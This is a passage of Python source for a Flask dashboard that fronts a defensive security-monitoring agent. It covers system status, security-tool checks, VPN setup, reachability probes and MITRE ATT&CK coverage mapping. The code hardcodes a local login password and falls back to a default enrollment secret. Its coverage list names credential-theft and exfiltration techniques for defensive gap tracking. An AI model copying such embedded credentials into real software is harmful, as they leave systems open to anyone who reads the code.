#!/usr/bin/env python3
"""
Seraph AI – Web Dashboard
=========================
Flask-based local web UI that mirrors every feature of the Tkinter desktop UI
while using the visual style from the original Defender installer web dashboard.

Runs on http://localhost:5000 by default.
"""

import os
import sys
import json
import time
import uuid
import socket
import shutil
import platform
import threading
import subprocess
import tempfile
import logging
from pathlib import Path
from datetime import datetime, timezone
from collections import deque
from typing import Dict, Any, List, Optional

from flask import Flask, render_template, jsonify, request, send_file, Response, url_for, redirect
from flask_cors import CORS

# ---------------------------------------------------------------------------
# Resolve import of UnifiedAgentCore from the desktop package
# ---------------------------------------------------------------------------
_this_dir = Path(__file__).resolve().parent          # …/ui/web
_desktop_dir = _this_dir.parent / "desktop"           # …/ui/desktop
_agent_root = _this_dir.parent.parent                 # …/unified_agent

# Add desktop dir so we can import main
if str(_desktop_dir) not in sys.path:
    sys.path.insert(0, str(_desktop_dir))
if str(_agent_root) not in sys.path:
    sys.path.insert(0, str(_agent_root))

# Avoid Tkinter import since we're headless – patch before import
import importlib
_tk_spec = importlib.util.find_spec("tkinter")
# We'll guard against Tkinter failing by pre-setting a minimal shim
_original_import = __builtins__.__import__ if hasattr(__builtins__, '__import__') else __import__

# We need to import UnifiedAgentCore and related constants without pulling in tkinter.
# Strategy: import the module source and exec the non-GUI classes.
import types as _types
import re as _re

try:
    import psutil
except ImportError:
    psutil = None

try:
    import requests as _requests
except ImportError:
    _requests = None

logger = logging.getLogger("SeraphWebUI")
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")


def _load_agent_core():
    """Import UnifiedAgentCore, AgentConfig, and constants from main.py
    without triggering Tkinter imports."""
    main_py = _desktop_dir / "main.py"
    if not main_py.exists():
        raise FileNotFoundError(f"Cannot find {main_py}")

    source = main_py.read_text(encoding="utf-8")

    # ---- Build a minimal tkinter stub so the import doesn't crash ----
    tk_stub = _types.ModuleType("tkinter")
    tk_stub.Tk = type("Tk", (), {"__init__": lambda *a, **kw: None})
    tk_stub.Frame = type("Frame", (), {})
    tk_stub.Label = type("Label", (), {})
    tk_stub.Button = type("Button", (), {})
    tk_stub.Toplevel = type("Toplevel", (), {})
    tk_stub.BOTH = "both"; tk_stub.X = "x"; tk_stub.Y = "y"
    tk_stub.LEFT = "left"; tk_stub.RIGHT = "right"; tk_stub.END = "end"
    tk_stub.W = "w"; tk_stub.DISABLED = "disabled"; tk_stub.NORMAL = "normal"
    tk_stub.BooleanVar = type("BooleanVar", (), {"__init__": lambda s, **kw: setattr(s, '_v', kw.get('value', False)),
                                                   "get": lambda s: s._v, "set": lambda s, v: setattr(s, '_v', v)})
    tk_stub.StringVar = type("StringVar", (), {"__init__": lambda s, **kw: setattr(s, '_v', kw.get('value', '')),
                                                 "get": lambda s: s._v, "set": lambda s, v: setattr(s, '_v', v),
                                                 "trace_add": lambda s, *a: None})
    tk_stub.IntVar = type("IntVar", (), {"__init__": lambda s, **kw: setattr(s, '_v', kw.get('value', 0)),
                                           "get": lambda s: s._v, "set": lambda s, v: setattr(s, '_v', v)})

    ttk_stub = _types.ModuleType("tkinter.ttk")
    ttk_stub.Style = type("Style", (), {"__init__": lambda *a, **kw: None,
                                          "configure": lambda *a, **kw: None,
                                          "map": lambda *a, **kw: None})
    ttk_stub.Frame = tk_stub.Frame
    ttk_stub.Label = tk_stub.Label
    ttk_stub.Button = tk_stub.Button
    ttk_stub.Notebook = type("Notebook", (), {})
    ttk_stub.Treeview = type("Treeview", (), {})
    ttk_stub.Scrollbar = type("Scrollbar", (), {})
    ttk_stub.Progressbar = type("Progressbar", (), {})
    ttk_stub.LabelFrame = type("LabelFrame", (), {})
    ttk_stub.Spinbox = type("Spinbox", (), {})
    ttk_stub.Entry = type("Entry", (), {})
    ttk_stub.Checkbutton = type("Checkbutton", (), {})

    messagebox_stub = _types.ModuleType("tkinter.messagebox")
    messagebox_stub.showinfo = lambda *a, **kw: None
    messagebox_stub.showerror = lambda *a, **kw: None
    messagebox_stub.showwarning = lambda *a, **kw: None
    messagebox_stub.askyesno = lambda *a, **kw: True

    scrolledtext_stub = _types.ModuleType("tkinter.scrolledtext")
    scrolledtext_stub.ScrolledText = type("ScrolledText", (), {})

    # Inject stubs
    sys.modules["tkinter"] = tk_stub
    sys.modules["tkinter.ttk"] = ttk_stub
    sys.modules["tkinter.messagebox"] = messagebox_stub
    sys.modules["tkinter.scrolledtext"] = scrolledtext_stub

    # Force-reload the module if it was already imported
    mod_name = "main"
    if mod_name in sys.modules:
        del sys.modules[mod_name]

    spec = importlib.util.spec_from_file_location(mod_name, main_py)
    module = importlib.util.module_from_spec(spec)
    sys.modules[mod_name] = module
    spec.loader.exec_module(module)

    return module


_main_module = _load_agent_core()
UnifiedAgentCore = _main_module.UnifiedAgentCore
AgentConfig = _main_module.AgentConfig
SUSPICIOUS_PORTS = _main_module.SUSPICIOUS_PORTS
SUSPICIOUS_PROCESS_NAMES = _main_module.SUSPICIOUS_PROCESS_NAMES
SERAPH_INTEGRATION_PROCESSES = _main_module.SERAPH_INTEGRATION_PROCESSES


def _load_monolithic_core():
    """Import monolithic UnifiedAgent from core/agent.py for canonical API integration."""
    monolithic_py = _agent_root / "core" / "agent.py"
    if not monolithic_py.exists():
        raise FileNotFoundError(f"Cannot find {monolithic_py}")

    mod_name = "monolithic_agent_core"
    if mod_name in sys.modules:
        return sys.modules[mod_name]

    spec = importlib.util.spec_from_file_location(mod_name, monolithic_py)
    module = importlib.util.module_from_spec(spec)
    sys.modules[mod_name] = module
    spec.loader.exec_module(module)
    return module


try:
    _mono_module = _load_monolithic_core()
    MonolithicUnifiedAgent = _mono_module.UnifiedAgent
    MonolithicAgentConfig = _mono_module.AgentConfig
except Exception as _mono_err:
    MonolithicUnifiedAgent = None
    MonolithicAgentConfig = None
    logger.warning(f"Monolithic agent core unavailable in web UI: {_mono_err}")

# ============================================================================
# Web-specific wrapper around the agent core
# ============================================================================

class WebAgentBridge:
    """Wraps UnifiedAgentCore and adds state tracking for the web UI."""

    # Keep interface naming consistent with monolithic core while preserving legacy compatibility.
    VPN_INTERFACES = ("metatron-vpn", "wg0")
    MONITOR_NAME_ALIASES = {
        "code-signing": "code_signing",
        "self-protection": "self_protection",
        "process-tree": "process_tree",
        "cli-telemetry": "cli_telemetry",
        "autothrottle": "auto_throttle",
        "webview": "webview2",
    }
    CORE_INTEGRATION_TOOLS = (
        "amass",
        "arkime",
        "bloodhound",
        "spiderfoot",
        "purplesharp",
        "velociraptor",
        "sigma",
        "atomic",
        "trivy",
        "falco",
        "suricata",
        "clamav",
        "yara",
        "zeek",
        "osquery",
    )

    # Credentials for auto-login against the local backend
    _LOCAL_EMAIL = "local@metatron.local"
    _LOCAL_PASSWORD = "MetatronLocal2026!"

    def __init__(self):
        self.agent = UnifiedAgentCore()
        self._cached_jwt: Optional[str] = None
        self.monolithic_agent = None
        self.monolithic_init_error = None
        self.monolithic_monitoring_active = False
        self._monolithic_thread = None
        self._vpn_autoboot_started = False
        self._startup_discovery_started = False
        self._last_usb_scan_result = {"success": True, "devices": [], "scan_time": 0.0}
        self.monitoring_active = False
        self.events: deque = deque(maxlen=500)
        self.logs: deque = deque(maxlen=1000)
        self.auto_reduce_log: deque = deque(maxlen=200)
        self.auto_execute_commands = False
        self.pending_commands: List[Dict] = []
        self.command_history: deque = deque(maxlen=200)
        self.quarantine_items: List[Dict] = []
        # Auto-reduce settings
        self.ar_enabled = True
        self.ar_cpu_thresh = 80
        self.ar_mem_thresh = 85
        self.ar_disk_thresh = 90
        self._ar_aggressive = True  # escalate from throttle → suspend → kill
        self._ar_max_rounds = 10    # max passes per cycle before giving up
        # Resource history
        self._cpu_history: deque = deque(maxlen=20)
        self._mem_history: deque = deque(maxlen=20)
        self._disk_history: deque = deque(maxlen=20)
        self._last_auto_reduce_time = 0
        # Lock for thread safety
        self._lock = threading.Lock()
        # CPU monitor — psutil.cpu_percent(interval=0) returns 0 without priming
        self._cpu_value = 0.0
        self._cpu_thread = threading.Thread(target=self._cpu_monitor_loop, daemon=True)
        self._cpu_thread.start()
        # Background auto-reduce loop (runs every 10s)
        self._ar_monitor_thread = threading.Thread(target=self._auto_reduce_monitor_loop, daemon=True)
        self._ar_monitor_thread.start()

        # Patch agent _log to capture to our log buffer
        original_log = self.agent._log.__func__ if hasattr(self.agent._log, '__func__') else None
        bridge = self

        def _patched_log(self_agent, message, level="INFO"):
            ts = datetime.now().strftime("%H:%M:%S")
            bridge.logs.appendleft({"time": ts, "level": level, "message": message})
        self.agent._log = lambda msg, lvl="INFO": _patched_log(self.agent, msg, lvl)

        # Set up web UI adapter so agent's command poll routes commands here
        self._setup_command_bridge()

        # Initialize monolithic core in-process so localhost:5000 is the canonical surface.
        self._setup_monolithic_bridge()
        self._maybe_run_startup_discovery()

    def _startup_discovery_enabled(self) -> bool:
        """Run one startup sweep, then leave heavy scans to explicit user actions."""
        return str(os.environ.get("SERAPH_AGENT_STARTUP_DISCOVERY", "true")).lower() in {"1", "true", "yes", "on"}

    def _maybe_run_startup_discovery(self):
        """Kick off a one-time startup discovery pass without enabling continuous loops."""
        if self._startup_discovery_started or not self._startup_discovery_enabled():
            return

        self._startup_discovery_started = True

        def _bg():
            try:
                time.sleep(8)
                self.log("Running one-time startup discovery sweep")

                if str(os.environ.get("SERAPH_AGENT_NETWORK_SCANNING", "true")).lower() in {"1", "true", "yes", "on"}:
                    self.scan_network()
                if str(os.environ.get("SERAPH_AGENT_WIRELESS_SCANNING", "true")).lower() in {"1", "true", "yes", "on"}:
                    self.scan_wireless()
                if str(os.environ.get("SERAPH_AGENT_BLUETOOTH_SCANNING", "true")).lower() in {"1", "true", "yes", "on"}:
                    self.scan_bluetooth()
                if str(os.environ.get("SERAPH_AGENT_USB_MONITORING", "true")).lower() in {"1", "true", "yes", "on"}:
                    self.scan_usb()

                self.log("Startup discovery complete; heavy scanners remain manual-only")
            except Exception as e:
                self.log(f"Startup discovery failed: {e}", "WARN")

        threading.Thread(target=_bg, daemon=True).start()

    def _vpn_state_path(self) -> Path:
        """Local persistence for dashboard VPN settings when remote config APIs are absent."""
        # The agent root may be mounted read-only in containers; fall back to a writable
        # temp directory so saves don't raise EROFS.
        primary = _agent_root / "vpn_ui_state.json"
        try:
            primary.parent.mkdir(parents=True, exist_ok=True)
            primary.touch(exist_ok=True)
            return primary
        except OSError:
            fallback = Path("/tmp/seraph_agent")
            fallback.mkdir(parents=True, exist_ok=True)
            return fallback / "vpn_ui_state.json"

    def _load_local_vpn_state(self) -> Dict[str, Any]:
        defaults = {
            "enabled": True,
            "server_address": "10.200.200.1/24",
            "port": 51820,
            "dns_servers": ["1.1.1.1", "8.8.8.8"],
            "kill_switch": True,
            "max_clients": 10,
        }
        try:
            path = self._vpn_state_path()
            if path.exists():
                with open(path, "r", encoding="utf-8") as fh:
                    data = json.load(fh)
                if isinstance(data, dict):
                    defaults.update(data)
        except Exception as e:
            logger.debug(f"Failed to load local VPN UI state: {e}")
        return defaults

    def _save_local_vpn_state(self, config: Dict[str, Any]) -> Dict[str, Any]:
        state = self._load_local_vpn_state()
        state.update(config or {})
        path = self._vpn_state_path()
        path.parent.mkdir(parents=True, exist_ok=True)
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(state, fh, indent=2)
        return state

    def _setup_monolithic_bridge(self):
        """Initialize monolithic UnifiedAgent instance for API unification on port 5000."""
        if not MonolithicUnifiedAgent or not MonolithicAgentConfig:
            self.monolithic_init_error = "Monolithic core import failed"
            return
        try:
            # Load persisted auth state if available (created by start_local.sh)
            auth_file = _agent_root / "agent_auth.json"
            persisted_auth = {}
            if auth_file.exists():
                try:
                    with open(auth_file, "r") as f:
                        persisted_auth = json.load(f)
                    self.log(f"Loaded persisted agent auth for {persisted_auth.get('agent_id')}")
                except Exception as e:
                    self.log(f"Failed to load agent_auth.json: {e}", "WARN")

            mono_cfg = MonolithicAgentConfig(
                server_url=getattr(self.agent.config, "server_url", "") or os.environ.get("REMOTE_SERVER_URL", "") or os.environ.get("BACKEND_URL", "http://backend:8001"),
                agent_id=persisted_auth.get("agent_id") or getattr(self.agent.config, "agent_id", "") or f"metatron-{socket.gethostname()}-local",
                agent_name=persisted_auth.get("agent_id") or getattr(self.agent.config, "agent_name", socket.gethostname()),
                enrollment_key=os.environ.get("SERAPH_AGENT_SECRET") or os.environ.get("SERAPH_ENROLLMENT_KEY", "dev-agent-secret-change-in-production"),
                auth_token=persisted_auth.get("auth_token", ""),
                update_interval=int(os.environ.get("SERAPH_AGENT_UPDATE_INTERVAL", "300") or 300),
                heartbeat_interval=int(os.environ.get("SERAPH_AGENT_HEARTBEAT_INTERVAL", "300") or 300),
                auto_remediate=str(os.environ.get("SERAPH_AGENT_AUTO_REMEDIATE", "true")).lower() in {"1", "true", "yes", "on"},
                network_scanning=str(os.environ.get("SERAPH_AGENT_NETWORK_SCANNING", "true")).lower() in {"1", "true", "yes", "on"},
                wireless_scanning=str(os.environ.get("SERAPH_AGENT_WIRELESS_SCANNING", "true")).lower() in {"1", "true", "yes", "on"},
                bluetooth_scanning=str(os.environ.get("SERAPH_AGENT_BLUETOOTH_SCANNING", "true")).lower() in {"1", "true", "yes", "on"},
                usb_monitoring=str(os.environ.get("SERAPH_AGENT_USB_MONITORING", "true")).lower() in {"1", "true", "yes", "on"},
                vns_sync=str(os.environ.get("SERAPH_AGENT_VNS_SYNC", "true")).lower() in {"1", "true", "yes", "on"},
                ai_analysis=str(os.environ.get("SERAPH_AGENT_AI_ANALYSIS", "true")).lower() in {"1", "true", "yes", "on"},
                threat_hunting=str(os.environ.get("SERAPH_AGENT_THREAT_HUNTING", "true")).lower() in {"1", "true", "yes", "on"},
                local_ui_enabled=False,
                local_ui_port=5000,
                vpn_auto_configure=str(os.environ.get("SERAPH_AGENT_VPN_AUTO_CONFIGURE", "true")).lower() in {"1", "true", "yes", "on"},
            )
            self.monolithic_agent = MonolithicUnifiedAgent(config=mono_cfg)
            self.log("Monolithic core bridge initialized for canonical UI")
            self._maybe_autoboot_vpn()
        except Exception as e:
            self.monolithic_init_error = str(e)
            self.log(f"Monolithic core bridge failed: {e}", "WARN")

    def _maybe_autoboot_vpn(self):
        """Auto-configure the local VPN when agent config enables it."""
        if self._vpn_autoboot_started or self.monolithic_agent is None:
            return

        agent_config = getattr(self.monolithic_agent, "config", None)
        if not agent_config:
            return

        if not getattr(agent_config, "server_url", ""):
            return
        if not getattr(agent_config, "vpn_auto_configure", False):
            return

        self._vpn_autoboot_started = True

        def _bg():
            try:
                vpn = getattr(self.monolithic_agent, "vpn", None)
                if vpn is None:
                    return
                if getattr(vpn, "is_connected", False):
                    self.log("VPN already connected")
                    return
                configured = vpn.auto_configure()
                if configured:
                    if getattr(vpn, "is_connected", False):
                        self.log("VPN configured and started automatically")
                    else:
                        self.log("VPN configured automatically; start may still require admin rights", "WARN")
                else:
                    self.log("Automatic VPN bootstrap failed", "WARN")
            except Exception as e:
                self.log(f"Automatic VPN bootstrap failed: {e}", "WARN")

        threading.Thread(target=_bg, daemon=True).start()

    def _cpu_monitor_loop(self):
        """Background thread: continuously measure CPU so values stay fresh."""
        if not psutil:
            return
        psutil.cpu_percent(interval=1)  # prime
        while True:
            try:
                self._cpu_value = psutil.cpu_percent(interval=1)
            except Exception:
                pass

    def _setup_command_bridge(self):
        """Install a web-compatible adapter as the agent's ui_ref so the
        command poll loop routes commands to our pending_commands list
        instead of auto-executing."""
        bridge = self

        class _ThresholdVar:
            """Mimics tk.IntVar/BooleanVar: exposes .get() for agent core."""
            def __init__(self, getter):
                self._getter = getter
            def get(self):
                return self._getter()

        class _WebUIAdapter:
            auto_execute_commands = False

            def __init__(self):
                self.root = self  # fake root for root.after()
                self.ar_cpu_thresh = _ThresholdVar(lambda: bridge.ar_cpu_thresh)
                self.ar_mem_thresh = _ThresholdVar(lambda: bridge.ar_mem_thresh)
                self.ar_disk_thresh = _ThresholdVar(lambda: bridge.ar_disk_thresh)
                self.auto_reduce_var = _ThresholdVar(lambda: bridge.ar_enabled)

            def after(self, _delay, callback):
                """Execute callback immediately (no Tk mainloop)."""
                try:
                    callback()
                except Exception:
                    pass

            def _queue_command(self, cmd):
                bridge.queue_command(cmd)

            def _add_history(self, cmd_id, cmd_type, status, result_text):
                bridge.command_history.appendleft({
                    "id": cmd_id, "type": cmd_type,
                    "status": status,
                    "result": str(result_text)[:200],
                    "time": datetime.now().strftime("%H:%M:%S")
                })

            def _log_auto_reduce(self, resource, action, detail):
                bridge.log_auto_reduce(resource, action, detail)

            def add_event(self, level, message):
                bridge.add_event(level, message)

        self.agent.ui_ref = _WebUIAdapter()

    def log(self, message: str, level: str = "INFO"):
        ts = datetime.now().strftime("%H:%M:%S")
        self.logs.appendleft({"time": ts, "level": level, "message": message})

    def add_event(self, level: str, message: str):
        ts = datetime.now().strftime("%H:%M:%S")
        self.events.appendleft({"time": ts, "level": level, "message": message})

    def log_auto_reduce(self, resource: str, action: str, detail: str):
        ts = datetime.now().strftime("%H:%M:%S")
        self.auto_reduce_log.appendleft({
            "time": ts, "resource": resource, "action": action, "detail": detail
        })

    # --- Agent lifecycle ---
    def start_monitoring(self):
        if self.monitoring_active:
            return {"status": "already_running"}
        self.log("Starting agent (connecting to servers)...")

        def _bg():
            try:
                self.agent.start()
            except Exception as e:
                logger.warning(f"Agent start error: {e}")
            self.monitoring_active = True
            if self.agent.registered:
                self.log("Monitoring started - Connected to server")
            else:
                self.log("Monitoring started - Server offline (local mode)", "WARN")
        threading.Thread(target=_bg, daemon=True).start()

        run_monolithic_loop = str(os.environ.get("SERAPH_AGENT_MONOLITHIC_LOOP", "true")).lower() in {"1", "true", "yes", "on"}

        # The monolithic core is expensive; keep its live monitor loop opt-in for local dashboards.
        if run_monolithic_loop and self.monolithic_agent is not None and not self.monolithic_monitoring_active:
            def _mono_bg():
                try:
                    self.monolithic_monitoring_active = True
                    self.monolithic_agent.start()
                except Exception as e:
                    self.monolithic_init_error = str(e)
                    self.log(f"Monolithic monitoring start error: {e}", "WARN")
                finally:
                    self.monolithic_monitoring_active = False

            self._monolithic_thread = threading.Thread(target=_mono_bg, daemon=True)
            self._monolithic_thread.start()
        elif self.monolithic_agent is not None and not run_monolithic_loop:
            self.log("Monolithic monitoring loop was disabled via SERAPH_AGENT_MONOLITHIC_LOOP override", "WARN")

        return {"status": "starting"}

    def stop_monitoring(self):
        if not self.monitoring_active:
            return {"status": "not_running"}
        try:
            self.agent.stop()
            self.monitoring_active = False
            if self.monolithic_agent is not None and self.monolithic_monitoring_active:
                try:
                    self.monolithic_agent.stop()
                except Exception:
                    pass
            self.log("Monitoring stopped")
            return {"status": "stopped"}
        except Exception as e:
            self.log(f"Failed to stop monitoring: {e}", "ERROR")
            return {"status": "error", "message": str(e)}

    def restart(self):
        if self.monitoring_active:
            self.stop_monitoring()
            time.sleep(1)
        self.start_monitoring()
        self.log("Agent restarted")
        return {"status": "restarting"}

    # --- System info ---
    def get_system_status(self) -> dict:
        cpu = mem_pct = disk_pct = 0.0
        mem_used = mem_total = disk_used = disk_total = 0
        if psutil:
            try:
                cpu = self._cpu_value  # from background thread
                mem = psutil.virtual_memory()
                mem_pct = mem.percent
                mem_used = mem.used
                mem_total = mem.total
                disk = psutil.disk_usage("/")
                disk_pct = disk.percent
                disk_used = disk.used
                disk_total = disk.total
                # Track history
                self._cpu_history.append(cpu)
                self._mem_history.append(mem_pct)
                self._disk_history.append(disk_pct)
            except Exception:
                pass

        status = {
            "monitoring_active": self.monitoring_active,
            "registered": self.agent.registered,
            "agent_id": self.agent.config.agent_id,
            "agent_name": self.agent.config.agent_name,
            "hostname": socket.gethostname(),
            "os": f"{platform.system()} {platform.release()}",
            "cpu_percent": round(cpu, 1),
            "memory_percent": round(mem_pct, 1),
            "memory_used_gb": round(mem_used / (1024**3), 1),
            "memory_total_gb": round(mem_total / (1024**3), 1),
            "disk_percent": round(disk_pct, 1),
            "disk_used_gb": round(disk_used / (1024**3), 1),
            "disk_total_gb": round(disk_total / (1024**3), 1),
            "cpu_trend": list(self._cpu_history)[-10:],
            "mem_trend": list(self._mem_history)[-10:],
            "ar_enabled": self.ar_enabled,
            "auto_execute_commands": self.auto_execute_commands,
            "pending_commands_count": len(self.pending_commands),
            "network_scanning": self.agent.config.network_scanning,
            "process_monitoring": self.agent.config.process_monitoring,
            "file_scanning": self.agent.config.file_scanning,
            "wireless_scanning": self.agent.config.wireless_scanning,
            "bluetooth_scanning": self.agent.config.bluetooth_scanning,
        }

        # Expose monolithic-core integration state in canonical status payload.
        status["monolithic_bridge"] = {
            "available": self.monolithic_agent is not None,
            "error": self.monolithic_init_error,
            "monitoring_active": self.monolithic_monitoring_active,
        }
        if self.monolithic_agent is not None:
            try:
                status["monolithic_agent_id"] = self.monolithic_agent.config.agent_id
                status["monolithic_monitor_count"] = len(self.monolithic_agent.monitors)
            except Exception:
                pass

        return status

    def get_monolithic_status(self) -> dict:
        """Get status directly from monolithic UnifiedAgent core."""
        if not self.monolithic_agent:
            return {"available": False, "error": self.monolithic_init_error or "Not initialized"}
        try:
            data = self.monolithic_agent.get_status()
            data["available"] = True
            return data
        except Exception as e:
            return {"available": False, "error": str(e)}

    def get_monolithic_dashboard(self) -> dict:
        """Get full dashboard payload from monolithic UnifiedAgent core."""
        if not self.monolithic_agent:
            return {"available": False, "error": self.monolithic_init_error or "Not initialized"}
        try:
            data = self.monolithic_agent.get_dashboard_data()
            data["available"] = True
            return data
        except Exception as e:
            return {"available": False, "error": str(e)}

    def get_yara_status(self) -> dict:
        """Expose YARA monitor status from monolithic core."""
        if not self.monolithic_agent:
            return {"available": False, "error": self.monolithic_init_error or "Not initialized"}
        monitor = self.monolithic_agent.monitors.get("yara")
        if not monitor:
            return {"available": False, "error": "YARA monitor not available"}
        try:
            status = monitor.get_status()
            status["available"] = True
            return status
        except Exception as e:
            return {"available": False, "error": str(e)}

    def run_yara_scan(self) -> dict:
        """Trigger one on-demand YARA scan from monolithic core."""
        if not self.monolithic_agent:
            return {"available": False, "error": self.monolithic_init_error or "Not initialized"}
        monitor = self.monolithic_agent.monitors.get("yara")
        if not monitor:
            return {"available": False, "error": "YARA monitor not available"}
        try:
            result = monitor.scan()
            result["available"] = True
            return result
        except Exception as e:
            return {"available": False, "error": str(e)}

    def _docker_container_state(self, names: List[str]) -> dict:
        """Best-effort check for a tool's dockerized service container."""
        docker_cmd = shutil.which("docker")
        # If docker CLI not present on PATH for this Python process (common on Windows),
        # try using WSL's docker if available (i.e. `wsl docker ps`).
        use_wsl = False
        if not docker_cmd and shutil.which("wsl"):
            use_wsl = True
            docker_cmd = "wsl"

        if not docker_cmd:
            return {"docker_available": False, "container_running": False, "container": None}
        try:
            cmd = [docker_cmd, "ps", "--format", "{{.Names}}"] if not use_wsl else ["wsl", "docker", "ps", "--format", "{{.Names}}"]
            output = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=5,
            )
            running = output.stdout.splitlines() if output.returncode == 0 else []
            for c in running:
                for n in names:
                    if n in c:
                        return {"docker_available": True, "container_running": True, "container": c}
            return {"docker_available": True, "container_running": False, "container": None}
        except Exception:
            return {"docker_available": True, "container_running": False, "container": None}

    def get_security_tooling_status(self) -> dict:
        """Return local capability/status for WireGuard, Trivy, Falco, Suricata, and Volatility."""
        def _bin_status(candidates: List[str]) -> dict:
            for cmd in candidates:
                path = shutil.which(cmd)
                if path:
                    return {"installed": True, "command": cmd, "path": path}
            return {"installed": False, "command": None, "path": None}

        tools = {
            "wireguard": {
                **_bin_status(["wg", "wg-quick", "wireguard"]),
                **self._docker_container_state(["wireguard"]),
            },
            "trivy": {
                **_bin_status(["trivy"]),
                **self._docker_container_state(["trivy"]),
            },
            "falco": {
                **_bin_status(["falco"]),
                **self._docker_container_state(["falco"]),
            },
            "suricata": {
                **_bin_status(["suricata"]),
                **self._docker_container_state(["suricata"]),
            },
            "volatility": {
                **_bin_status(["vol", "volatility", "volatility3"]),
                **self._docker_container_state(["volatility"]),
            },
        }

        # Add wireguard runtime detail from monolithic core where available.
        if self.monolithic_agent is not None:
            try:
                tools["wireguard"]["agent_vpn"] = self.monolithic_agent.get_vpn_status()
            except Exception as e:
                tools["wireguard"]["agent_vpn_error"] = str(e)

        issues = []
        for tool_name in ("trivy", "falco", "suricata", "volatility"):
            t = tools[tool_name]
            if not t.get("installed") and not t.get("container_running"):
                issues.append(f"{tool_name} is not installed and no running container was detected")

        wireguard_tool = tools["wireguard"]
        agent_vpn_status = wireguard_tool.get("agent_vpn", {}) if isinstance(wireguard_tool.get("agent_vpn"), dict) else {}
        if not wireguard_tool.get("installed") and not wireguard_tool.get("container_running") and not agent_vpn_status.get("configured"):
            issues.append("wireguard is unavailable locally and monolithic VPN is not configured")

        return {
            "checked_at": datetime.now(timezone.utc).isoformat(),
            "tools": tools,
            "issues": issues,
            "ready": len(issues) == 0,
        }

    def get_external_access_status(self, request_host_url: Optional[str] = None) -> dict:
        """Best-effort check for local and externally forwarded dashboard reachability."""
        port = 5000
        host_url = (request_host_url or "").rstrip("/")
        local_status_url = f"http://127.0.0.1:{port}/api/status"

        codespace_name = os.environ.get("CODESPACE_NAME", "")
        forward_domain = os.environ.get("GITHUB_CODESPACES_PORT_FORWARDING_DOMAIN", "")
        forwarded_base_url = None
        if codespace_name and forward_domain:
            forwarded_base_url = f"https://{codespace_name}-{port}.{forward_domain}"

        checks = {
            "local_listener": {
                "ok": False,
                "error": None,
            },
            "local_status_http": {
                "ok": False,
                "status_code": None,
                "error": None,
                "url": local_status_url,
            },
            "host_status_http": {
                "ok": False,
                "status_code": None,
                "error": None,
                "url": f"{host_url}/api/status" if host_url else None,
            },
            "forwarded_status_http": {
                "ok": False,
                "status_code": None,
                "error": None,
                "url": f"{forwarded_base_url}/api/status" if forwarded_base_url else None,
            },
        }

        # Raw TCP listener check on localhost:5000.
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=1.5):
                checks["local_listener"]["ok"] = True
        except Exception as e:
            checks["local_listener"]["error"] = str(e)

        # HTTP checks using requests if available.
        def _probe(name: str, url: Optional[str]):
            if not url:
                return
            if _requests is None:
                checks[name]["error"] = "requests dependency not available"
                return
            try:
                resp = _requests.get(url, timeout=3, allow_redirects=False)
                checks[name]["status_code"] = resp.status_code
                checks[name]["ok"] = 200 <= resp.status_code < 400
            except Exception as ex:
                checks[name]["error"] = str(ex)

        _probe("local_status_http", checks["local_status_http"]["url"])
        _probe("host_status_http", checks["host_status_http"]["url"])
        _probe("forwarded_status_http", checks["forwarded_status_http"]["url"])

        issues = []
        if not checks["local_listener"]["ok"]:
            issues.append("Dashboard process is not listening on localhost:5000")
        if not checks["local_status_http"]["ok"]:
            issues.append("Local status endpoint probe failed on localhost:5000")
        if forwarded_base_url and not checks["forwarded_status_http"]["ok"]:
            issues.append("Codespaces forwarded URL probe failed; verify port 5000 forwarding visibility")

        recommendations = []
        if forwarded_base_url:
            recommendations.append("In Codespaces, ensure port 5000 is forwarded and visibility permits browser access")
            recommendations.append("Open the forwarded URL shown in forwarded_base_url")
        else:
            recommendations.append("If running remote dev environments, verify port forwarding for 5000")
        recommendations.append("Confirm canonical launcher is used: bash unified_agent/run_local_dashboard.sh")

        return {
            "checked_at": datetime.now(timezone.utc).isoformat(),
            "port": port,
            "host_url": host_url or None,
            "is_codespaces": bool(codespace_name and forward_domain),
            "forwarded_base_url": forwarded_base_url,
            "checks": checks,
            "issues": issues,
            "reachable": len(issues) == 0,
            "recommendations": recommendations,
        }

    def get_attack_coverage(self) -> dict:
        """Return ATT&CK technique references discovered in the monolithic core plus prioritized gaps."""
        core_file = _agent_root / "core" / "agent.py"
        techniques: List[str] = []
        if core_file.exists():
            try:
                source = core_file.read_text(encoding="utf-8", errors="ignore")
                techniques = sorted(set(_re.findall(r"T\d{4}(?:\.\d{3})?", source)))
            except Exception:
                techniques = []

        priority_gaps = [
            {"technique": "T1195", "name": "Supply Chain Compromise", "status": "missing"},
            {"technique": "T1199", "name": "Trusted Relationship", "status": "missing"},
            {"technique": "T1113", "name": "Screen Capture", "status": "missing"},
            {"technique": "T1123", "name": "Audio Capture", "status": "missing"},
            {"technique": "T1125", "name": "Video Capture", "status": "missing"},
            {"technique": "T1530", "name": "Data from Cloud Storage", "status": "missing"},
            {"technique": "T1078.004", "name": "Valid Accounts: Cloud Accounts", "status": "missing"},
            {"technique": "T1528", "name": "Steal Application Access Token", "status": "missing"},
            {"technique": "T1552.001", "name": "Credentials in Files", "status": "missing"},
            {"technique": "T1567.002", "name": "Exfiltration to Cloud Storage", "status": "missing"},
        ]

        present_set = set(techniques)
        for gap in priority_gaps:
            if gap["technique"] in present_set:
                gap["status"] = "covered"

        tactic_checks = {
            "initial_access": ["T1190", "T1566", "T1189"],
            "execution": ["T1059", "T1106"],
            "persistence": ["T1547", "T1053", "T1543"],
            "privilege_escalation": ["T1068", "T1548"],
            "defense_evasion": ["T1027", "T1562", "T1036"],
            "credential_access": ["T1003", "T1555", "T1558"],
            "discovery": ["T1046", "T1083", "T1012"],
            "lateral_movement": ["T1021.002", "T1021.006"],
            "collection": ["T1005", "T1056.001"],
            "command_and_control": ["T1071", "T1095"],
            "exfiltration": ["T1041", "T1048"],
            "impact": ["T1486", "T1490", "T1489"],
        }
        tactics = {}
        for tactic, refs in tactic_checks.items():
            matched = []
            for ref in refs:
                if any(t == ref or t.startswith(ref + ".") for t in techniques):
                    matched.append(ref)
            tactics[tactic] = {
                "covered": len(matched) > 0,
                "matched_references": matched,
                "reference_count": len(refs),
            }

        return {
            "checked_at": datetime.now(timezone.utc).isoformat(),
            "technique_count": len(techniques),
            "techniques": techniques,
            "tactics": tactics,
            "priority_gaps": priority_gaps,
        }

    def get_backend_integration_gap_report(self) -> dict:
